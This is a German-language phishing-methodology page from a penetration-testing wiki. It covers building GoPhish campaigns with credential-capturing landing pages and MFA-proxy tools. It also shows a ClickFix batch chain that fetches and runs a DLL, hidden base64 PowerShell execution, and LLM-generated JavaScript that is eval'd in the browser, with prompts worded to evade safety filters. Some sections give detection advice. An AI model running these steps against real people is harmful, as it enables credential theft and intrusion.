# Phishing-Methodik

{{#include ../../banners/hacktricks-training.md}}

## Methodik

1. Recon the victim
1. Select the **Ziel-Domain**.
2. Führe eine grundlegende Web-Enumeration durch, **suche nach Login-Portalen** der Zielperson und **entscheide**, welches du **vortäuschen** wirst.
3. Nutze etwas **OSINT**, um **E-Mail-Adressen zu finden**.
2. Prepare the environment
1. **Kaufe die Domain**, die du für die Phishing-Bewertung verwenden wirst
2. **Konfiguriere die zum E-Mail-Service gehörenden Records** (SPF, DMARC, DKIM, rDNS)
3. Konfiguriere den VPS mit **gophish**
3. Prepare the campaign
1. Bereite die **E-Mail-Vorlage** vor
2. Bereite die **Webseite** vor, um die Zugangsdaten zu stehlen
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Techniken zur Variation von Domainnamen

- **Keyword**: Der Domainname **enthält** ein wichtiges **Keyword** der Original-Domain (z. B. zelster.com-management.com).
- **Hyphenierte Subdomain**: Ersetze den **Punkt durch einen Bindestrich** in einer Subdomain (z. B. www-zelster.com).
- **New TLD**: Dieselbe Domain mit einer **neuen TLD** (z. B. zelster.org)
- **Homoglyph**: Ersetzt einen Buchstaben im Domainnamen durch **ähnlich aussehende Zeichen** (z. B. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Vertauscht **zwei Buchstaben** innerhalb des Domainnamens (z. B. zelsetr.com).
- **Singularisierung/Pluralisierung**: Fügt ein „s“ hinzu oder entfernt es am Ende des Domainnamens (z. B. zeltsers.com).
- **Auslassung**: Entfernt **einen** Buchstaben aus dem Domainnamen (z. B. zelser.com).
- **Wiederholung:** Wiederholt **einen** Buchstaben im Domainnamen (z. B. zeltsser.com).
- **Ersetzung**: Wie Homoglyph, aber weniger unauffällig. Ersetzt einen Buchstaben im Domainnamen, möglicherweise durch einen Buchstaben in der Nähe auf der Tastatur (z. B. zektser.com).
- **Subdomained**: Füge einen **Punkt** in den Domainnamen ein (z. B. ze.lster.com).
- **Einfügung**: **Fügt einen Buchstaben** in den Domainnamen ein (z. B. zerltser.com).
- **Fehlender Punkt**: Hängt die TLD an den Domainnamen an. (z. B. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Es besteht die **Möglichkeit, dass eines oder mehrere Bits, die gespeichert sind oder übertragen werden, automatisch umkippen** (bit flip) aufgrund verschiedener Faktoren wie Sonnenstürmen, kosmischen Strahlen oder Hardwarefehlern.

Wenn dieses Konzept auf DNS-Anfragen **angewendet** wird, ist es möglich, dass die **Domain, die der DNS-Server empfängt**, nicht dieselbe ist wie die ursprünglich angeforderte Domain.

Zum Beispiel kann eine einzelne Bit-Änderung in der Domain "windows.com" sie in "windnws.com" verändern.

Angreifer können dies **ausnutzen**, indem sie mehrere bit-flipping Domains registrieren, die der Domain des Opfers ähneln. Ihre Absicht ist es, legitime Benutzer auf ihre Infrastruktur umzuleiten.

Für mehr Informationen lies [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Kaufe eine vertrauenswürdige Domain

Du kannst auf [https://www.expireddomains.net/](https://www.expireddomains.net) nach einer abgelaufenen Domain suchen, die du verwenden könntest.\
Um sicherzustellen, dass die abgelaufene Domain, die du kaufen willst, **bereits ein gutes SEO** hat, kannst du prüfen, wie sie kategorisiert ist:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-Mail-Adressen entdecken

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Um **mehr gültige** E-Mail-Adressen zu **entdecken** oder die bereits gefundenen Adressen zu **verifizieren**, kannst du prüfen, ob du die SMTP-Server des Opfers brute-forcen kannst. [Erfahre hier, wie man E-Mail-Adressen verifiziert/entdeckt](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Außerdem: Vergiss nicht, dass wenn Benutzer **ein Web-Portal** zur Mail-Nutzung verwenden, du prüfen kannst, ob es für **Benutzername-Bruteforce** anfällig ist, und die Schwachstelle bei Möglichkeit ausnutzen.

## GoPhish konfigurieren

### Installation

Du kannst es herunterladen von [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Entpacke es in `/opt/gophish` und führe `/opt/gophish/gophish` aus.\
In der Ausgabe wird dir ein Passwort für den Admin-Benutzer für den Port 3333 angezeigt. Greife daher auf diesen Port zu und verwende diese Anmeldedaten, um das Admin-Passwort zu ändern. Möglicherweise musst du diesen Port auf lokal tunneln:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguration

**TLS-Zertifikat-Konfiguration**

Vor diesem Schritt sollten Sie **die Domain bereits gekauft haben**, die Sie verwenden werden, und sie muss **zeigen** auf die **IP des VPS**, auf dem Sie **gophish** konfigurieren.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail-Konfiguration**

Beginne mit der Installation: `apt-get install postfix`

Füge dann die Domain zu den folgenden Dateien hinzu:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Ändere außerdem die Werte der folgenden Variablen in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Ändere schließlich die Dateien **`/etc/hostname`** und **`/etc/mailname`** auf deinen Domainnamen und **starte deinen VPS neu.**

Erstelle nun einen **DNS A record** für `mail.<domain>`, der auf die **IP-Adresse** des VPS zeigt, und einen **DNS MX**-Eintrag, der auf `mail.<domain>` zeigt.

Jetzt testen wir das Senden einer E-Mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-Konfiguration**

Beende die Ausführung von gophish und konfiguriere es.\
Ändere `/opt/gophish/config.json` wie folgt (beachte die Verwendung von https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish-Dienst konfigurieren**

Um den gophish-Dienst zu erstellen, damit er automatisch gestartet und als Dienst verwaltet werden kann, können Sie die Datei `/etc/init.d/gophish` mit folgendem Inhalt anlegen:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Schließe die Konfiguration des Dienstes ab und überprüfe ihn, indem du:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mailserver und Domain konfigurieren

### Warten & legitim wirken

Je älter eine Domain ist, desto unwahrscheinlicher wird sie als Spam eingestuft. Du solltest daher so viel Zeit wie möglich warten (mindestens 1 Woche) bevor die phishing assessment stattfindet. Außerdem verbessert sich die Reputation, wenn du eine Seite zu einem reputablen Sektor anlegst.

Beachte, dass du selbst wenn du eine Woche warten musst, jetzt bereits alles konfigurieren kannst.

### Configure Reverse DNS (rDNS) record

Setze einen rDNS (PTR) Record, der die IP-Adresse des VPS auf den Domainnamen auflöst.

### Sender Policy Framework (SPF) Record

Du musst **einen SPF record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein SPF record ist [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Du kannst [https://www.spfwizard.net/](https://www.spfwizard.net) verwenden, um deine SPF-Policy zu generieren (verwende die IP des VPS)

![](<../../images/image (1037).png>)

Das ist der Inhalt, der in einem TXT record der Domain gesetzt werden muss:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Du musst **einen DMARC record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC record ist [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Du musst einen neuen DNS TXT-Eintrag erstellen, der auf den Hostnamen `_dmarc.<domain>` zeigt, mit folgendem Inhalt:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Du musst **einen DKIM für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC record ist [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Dieses Tutorial basiert auf: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Du musst die beiden B64-Werte, die der DKIM-Schlüssel erzeugt, aneinanderfügen:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Teste die Bewertung deiner E-Mail-Konfiguration

Du kannst das mit [https://www.mail-tester.com/](https://www.mail-tester.com/)\  
Rufe einfach die Seite auf und sende eine E-Mail an die Adresse, die sie dir geben:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Du kannst außerdem **deine E‑Mail-Konfiguration überprüfen**, indem du eine E‑Mail an `check-auth@verifier.port25.com` sendest und die **Antwort liest** (dazu musst du **Port** **25** öffnen und die Antwort in der Datei _/var/mail/root_ ansehen, falls du die E‑Mail als root sendest).\
Stelle sicher, dass du alle Tests bestehst:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Du könntest auch eine **Nachricht an ein unter deiner Kontrolle stehendes Gmail** senden und die **E-Mail-Header** in deinem Gmail-Posteingang überprüfen, `dkim=pass` sollte im Header-Feld `Authentication-Results` vorhanden sein.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Entfernen von Spamhouse Blacklist

Die Seite [www.mail-tester.com](https://www.mail-tester.com) kann dir anzeigen, ob deine Domain von spamhouse blockiert wird. Du kannst die Entfernung deiner Domain/IP anfordern unter: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Entfernen von Microsoft Blacklist

​​Du kannst die Entfernung deiner Domain/IP anfordern unter [https://sender.office.com/](https://sender.office.com).

## Erstellen & Starten GoPhish Campaign

### Sendeprofil

- Gib einen **Namen zur Identifikation** des Senderprofils an
- Entscheide, von welchem Konto du die Phishing-E-Mails senden wirst. Vorschläge: _noreply, support, servicedesk, salesforce..._
- Du kannst Benutzername und Passwort leer lassen, aber stelle sicher, dass du "Ignore Certificate Errors" aktivierst

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Es wird empfohlen, die Funktion "**Send Test Email**" zu verwenden, um zu testen, ob alles funktioniert.\
> Ich empfehle, **die Test-E-Mails an 10min mails Adressen** zu senden, um zu vermeiden, blacklisted zu werden.

### E-Mail-Vorlage

- Gib einen **Namen zur Identifikation** der Vorlage an
- Dann schreibe eine **Betreffzeile** (nichts Seltsames, nur etwas, das du in einer normalen E-Mail erwarten würdest)
- Stelle sicher, dass "**Add Tracking Image**" angehakt ist
- Schreibe die **E-Mail-Vorlage** (du kannst Variablen verwenden wie im folgenden Beispiel):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Beachte, dass **um die Glaubwürdigkeit der E-Mail zu erhöhen** empfohlen wird, eine Signatur aus einer E-Mail des Kunden zu verwenden. Vorschläge:

- Sende eine E-Mail an eine **nicht existente Adresse** und prüfe, ob die Antwort eine Signatur enthält.
- Suche nach **öffentlichen E-Mails** wie info@ex.com oder press@ex.com oder public@ex.com und sende ihnen eine E-Mail und warte auf die Antwort.
- Versuche, **eine gültige entdeckte** E-Mail zu kontaktieren und warte auf die Antwort.

![](<../../images/image (80).png>)

> [!TIP]
> Das Email-Template ermöglicht auch, **Dateien anzuhängen, die gesendet werden sollen**. Wenn du NTLM-Challenges mit speziell gestalteten Dateien/Dokumenten stehlen möchtest, [lies diese Seite](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Gib einen **Namen** an
- **Schreibe den HTML-Code** der Webseite. Beachte, dass du **Webseiten importieren** kannst.
- Markiere **Capture Submitted Data** und **Capture Passwords**
- Setze eine **Umleitung**

![](<../../images/image (826).png>)

> [!TIP]
> Normalerweise musst du den HTML-Code der Seite anpassen und lokal testen (vielleicht mit einem Apache-Server), **bis dir das Ergebnis gefällt.** Dann füge diesen HTML-Code in das Feld ein.\
> Beachte, dass du, wenn du **statische Ressourcen** für das HTML (z. B. CSS- und JS-Dateien) benötigst, diese in _**/opt/gophish/static/endpoint**_ speichern und dann über _**/static/\<filename>**_ darauf zugreifen kannst.

> [!TIP]
> Für die Umleitung könntest du die Benutzer zur legitimen Hauptwebseite des Opfers weiterleiten oder sie z. B. zu _/static/migration.html_ schicken, ein **Ladesymbol** ([**https://loading.io/**](https://loading.io)) für 5 Sekunden anzeigen und dann angeben, dass der Vorgang erfolgreich war.

### Users & Groups

- Vergib einen Namen
- **Importiere die Daten** (beachte, dass du für die Verwendung der Vorlage im Beispiel firstname, last name und email address jedes Benutzers benötigst)

![](<../../images/image (163).png>)

### Campaign

Erstelle abschließend eine Kampagne, wähle einen Namen, das Email-Template, die Landing-Page, die URL, das Sending Profile und die Gruppe. Beachte, dass die URL der Link ist, der an die Opfer gesendet wird.

Beachte, dass das **Sending Profile** das Versenden einer Test-E-Mail erlaubt, um zu sehen, wie die finale Phishing-E-Mail aussehen wird:

![](<../../images/image (192).png>)

> [!TIP]
> Ich würde empfehlen, **Test-E-Mails an 10min mails addresses** zu senden, um zu vermeiden, dass du beim Testen auf schwarze Listen landest.

Sobald alles bereit ist, starte einfach die Kampagne!

## Website Cloning

Wenn du aus irgendeinem Grund die Website klonen möchtest, siehe folgende Seite:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bei einigen Phishing-Engagements (hauptsächlich für Red Teams) möchtest du möglicherweise auch **Dateien mit einer Art Backdoor versenden** (vielleicht ein C2 oder etwas, das eine Authentifizierung auslöst).\
Sieh dir die folgende Seite für Beispiele an:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Der vorherige Angriff ist ziemlich clever, da du eine echte Webseite vortäuschst und die vom Benutzer eingegebenen Informationen sammelst. Leider, wenn der Benutzer nicht das korrekte Passwort eingegeben hat oder die von dir gefälschte Anwendung mit 2FA konfiguriert ist, **ermöglichen diese Informationen dir nicht, das getäuschte Konto zu übernehmen**.

Hier kommen Tools wie [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) und [**muraena**](https://github.com/muraenateam/muraena) ins Spiel. Diese Tools erlauben dir einen MitM-Angriff. Grundsätzlich funktioniert der Angriff folgendermaßen:

1. Du gibst das **Login-Formular** der echten Webseite vor.
2. Der Benutzer sendet seine **credentials** an deine gefälschte Seite und das Tool leitet diese an die echte Webseite weiter, um zu **prüfen, ob die credentials funktionieren**.
3. Wenn das Konto mit **2FA** konfiguriert ist, fordert die MitM-Seite diese an und sobald der **Benutzer sie eingibt**, sendet das Tool sie an die echte Webseite.
4. Sobald der Benutzer authentifiziert ist, hast du (als Angreifer) **die erfassten credentials, die 2FA, das Cookie und alle Informationen** jeder Interaktion erfasst, während das Tool den MitM durchführt.

### Via VNC

Was, wenn du den Nutzer statt auf eine bösartige Seite mit gleichem Erscheinungsbild zu einer **VNC-Session mit einem Browser, der mit der echten Webseite verbunden ist**, schickst? Du kannst sehen, was er macht, das Passwort stehlen, die verwendete MFA, die Cookies...\
Das kannst du mit [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) machen.

## Detecting the detection

Offensichtlich ist eine der besten Methoden, um zu wissen, ob du erwischt wurdest, deine Domain in Blacklists zu **suchen**. Wenn sie gelistet ist, wurde deine Domain als verdächtig erkannt.\
Eine einfache Möglichkeit, zu prüfen, ob deine Domain in einer Blacklist erscheint, ist die Nutzung von [https://malwareworld.com/](https://malwareworld.com)

Es gibt jedoch andere Wege, um zu wissen, ob das Opfer **aktiv nach verdächtiger Phishing-Aktivität in der Natur sucht**, wie in folgendem erklärt:

{{#ref}}
detecting-phising.md
{{#endref}}

Du kannst **eine Domain mit einem sehr ähnlichen Namen** wie die des Opfers kaufen **und/oder ein Zertifikat** für eine **Subdomain** einer von dir kontrollierten Domain **generieren**, das das **Schlüsselwort** der Domain des Opfers enthält. Wenn das **Opfer** irgendwelche DNS- oder HTTP-Interaktionen mit diesen Domains durchführt, weißt du, dass **es aktiv nach** verdächtigen Domains sucht und du sehr stealthy vorgehen musst.

### Evaluate the phishing

Verwende [**Phishious**](https://github.com/Rices/Phishious), um zu bewerten, ob deine E-Mail im Spam-Ordner landen, blockiert oder erfolgreich sein wird.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modernere Intrusion-Sets überspringen zunehmend E-Mail-Lockmittel und **zielen direkt auf den Service-Desk / Identity-Recovery-Workflow**, um MFA zu umgehen. Der Angriff ist vollständig "living-off-the-land": Sobald der Operator gültige credentials besitzt, pivotet er mit eingebauten Admin-Tools – keine Malware ist erforderlich.

### Attack flow
1. Recon des Opfers
* Sammle persönliche & unternehmensbezogene Details von LinkedIn, Datenlecks, öffentlichen GitHub-Repositories usw.
* Identifiziere hochrangige Identitäten (Executives, IT, Finance) und ermittle den **genauen Help-Desk-Prozess** für Passwort-/MFA-Resets.
2. Echtzeit-Social-Engineering
* Rufe den Help-Desk an, kontaktiere ihn per Teams oder Chat und gib dich als Zielperson aus (oft mit **spoofed caller-ID** oder **klonierter Stimme**).
* Gib die zuvor gesammelten PII an, um verification basierend auf Wissen zu bestehen.
* Überzeuge den Agenten, die **MFA-Secret zurückzusetzen** oder einen **SIM-Swap** auf eine registrierte Mobilnummer durchzuführen.
3. Sofortige Post-Access-Aktionen (≤60 min in realen Fällen)
* Etabliere einen Fuß in einem Web-SSO-Portal.
* Enumarate AD / AzureAD mit eingebauten Tools (es werden keine Binärdateien abgelegt):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Laterale Bewegung mit **WMI**, **PsExec** oder legitimen **RMM**-Agenten, die bereits in der Umgebung auf der Whitelist stehen.

### Detection & Mitigation
* Behandle Help-Desk-Identity-Recovery als eine **privilegierte Operation** – erfordere Step-up-Authentifizierung & die Genehmigung eines Managers.
* Setze **Identity Threat Detection & Response (ITDR)** / **UEBA**-Regeln ein, die alarmieren bei:
* MFA-Methode geändert + Authentifizierung von neuem Gerät / neuer Geo-Location.
* Sofortige Erhöhung desselben Prinzips (User → Admin).
* Nimm Help-Desk-Anrufe auf und erzwinge einen **Callback an eine bereits registrierte Nummer**, bevor ein Reset vorgenommen wird.
* Implementiere **Just-In-Time (JIT) / Privileged Access**, sodass neu zurückgesetzte Konten **nicht** automatisch hochtprivilegierte Tokens erhalten.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity-Crews kompensieren die Kosten für High-Touch-Operationen mit Massenangriffen, die **Suchmaschinen & Werbenetzwerke als Verbreitungskanal** missbrauchen.

1. **SEO poisoning / malvertising** schiebt ein gefälschtes Ergebnis wie `chromium-update[.]site` an die Spitze der Suchanzeigen.
2. Das Opfer lädt einen kleinen **First-Stage Loader** herunter (oft JS/HTA/ISO). Beispiele, die Unit 42 gesehen hat:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Der Loader exfiltriert Browser-Cookies + Credential-DBs und zieht dann einen **silent loader**, der in *Realtime* entscheidet, ob er deployt:
* RAT (z. B. AsyncRAT, RustDesk)
* Ransomware / Wiper
* Persistence-Komponente (Registry Run-Key + Scheduled Task)

### Hardening tips
* Blockiere neu registrierte Domains & setze **Advanced DNS / URL Filtering** auf Suchanzeigen sowie E-Mails durch.
* Beschränke Softwareinstallation auf signierte MSI / Store-Pakete, verweigere `HTA`, `ISO`, `VBS`-Ausführung per Richtlinie.
* Überwache Child-Prozesse von Browsern, die Installer öffnen:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Suche nach LOLBins, die häufig von First-Stage-Loadern missbraucht werden (z. B. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: Klon einer nationalen CERT-Mitteilung mit einem **Update**-Button, der schrittweise „Fix“-Anweisungen anzeigt. Opfer sollen eine Batch ausführen, die eine DLL herunterlädt und über `rundll32` ausführt.
* Typische Batchkette beobachtet:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` legt das Payload in `%TEMP%` ab, ein kurzer Sleep verbirgt Netzwerklatenz, dann ruft `rundll32` den exportierten Entry-Point (`notepad`) auf.
* Die DLL beaconed Host-Identität und pollt das C2 alle paar Minuten. Remote-Tasking kommt als **base64-kodiertes PowerShell**, das verborgen und mit Policy-Bypass ausgeführt wird:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Das erhält die C2-Flexibilität (der Server kann Tasks tauschen, ohne die DLL zu aktualisieren) und versteckt Konsolenfenster. Suche nach PowerShell-Children von `rundll32.exe`, die `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` zusammen nutzen.
* Defender können nach HTTP(S)-Callbacks der Form `...page.php?tynor=<COMPUTER>sss<USER>` und 5-Minuten-Polling-Intervallen nach DLL-Ladung suchen.

---

## AI-Enhanced Phishing Operations
Angreifer verketten jetzt **LLM- & Voice-Clone-APIs** für vollständig personalisierte Lockmittel und Echtzeit-Interaktion.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generiere & sende >100k E-Mails / SMS mit randomisiertem Text & Tracking-Links.|
|Generative AI|Erzeuge *einmalige* E-Mails, die auf öffentliche M&A, Insider-Witze aus Social Media verweisen; Deep-Fake-CEO-Stimme in Callback-Scams.|
|Agentic AI|Registriere autonom Domains, scrape Open-Source-Intel, verfasse nächste Stage-Mails, wenn ein Opfer klickt, aber keine creds absendet.|

**Verteidigung:**
• Füge **dynamische Banner** hinzu, die Nachrichten hervorheben, die von untrusted automation gesendet wurden (bei ARC/DKIM-Anomalien).  
• Setze **voice-biometric challenge phrases** für Hochrisiko-Telefonanfragen ein.  
• Simuliere kontinuierlich AI-generierte Lockmittel in Awareness-Programmen – statische Templates sind obsolet.

Siehe auch – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Siehe auch – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Angreifer können harmlos aussehendes HTML verschicken und den Stealer zur Laufzeit **durch das Abfragen eines vertrauenswürdigen LLM-APIs** für JavaScript generieren lassen und dann im Browser ausführen (z. B. `eval` oder dynamisches `<script>`).

1. **Prompt-as-obfuscation:** enkodiere Exfil-URLs/Base64-Strings im Prompt; variiere die Formulierungen, um Safety-Filter zu umgehen und Halluzinationen zu reduzieren.
2. **Client-side API call:** Beim Laden ruft JS ein öffentliches LLM (Gemini/DeepSeek/etc.) oder einen CDN-Proxy auf; nur der Prompt/API-Call ist im statischen HTML vorhanden.
3. **Assemble & exec:** Konkatenieren der Antwort und Ausführen (polymorph pro Besuch):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generierter Code personalisiert das Lockmittel (z.B. LogoKit token parsing) und postet creds an den prompt-hidden endpoint.

**Evasion traits**
- Der Traffic erreicht bekannte LLM-Domains oder vertrauenswürdige CDN-Proxies; manchmal via WebSockets zu einem Backend.
- Kein statischer Payload; bösartiges JS existiert erst nach dem Rendern.
- Nicht-deterministische Generierungen erzeugen pro Sitzung **unique** stealers.

**Detection ideas**
- Führe Sandboxes mit aktiviertem JS aus; markiere **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Suche nach Front-end POSTs an LLM APIs, die unmittelbar von `eval`/`Function` auf dem zurückgegebenen Text gefolgt werden.
- Alarmiere bei nicht genehmigten LLM-Domains im Client-Traffic sowie anschließenden credential POSTs.

---

## MFA Fatigue / Push Bombing Variante – Erzwungener Reset
Neben klassischem Push-Bombing erzwingen Operatoren während des Help-Desk-Anrufs einfach **eine neue MFA-Registrierung erzwingen**, wodurch das bestehende Token des Benutzers ungültig wird. Jeder anschließende Login-Prompt erscheint für das Opfer legitim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Überwache AzureAD/AWS/Okta-Events, bei denen **`deleteMFA` + `addMFA`** **innerhalb weniger Minuten von derselben IP** auftreten.



## Clipboard Hijacking / Pastejacking

Angreifer können stillschweigend bösartige Befehle in die Zwischenablage des Opfers von einer kompromittierten oder typosquatted Webseite kopieren und den Benutzer dann dazu bringen, diese in **Win + R**, **Win + X** oder ein Terminalfenster einzufügen, wodurch beliebiger Code ausgeführt wird, ganz ohne Download oder Anhang.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
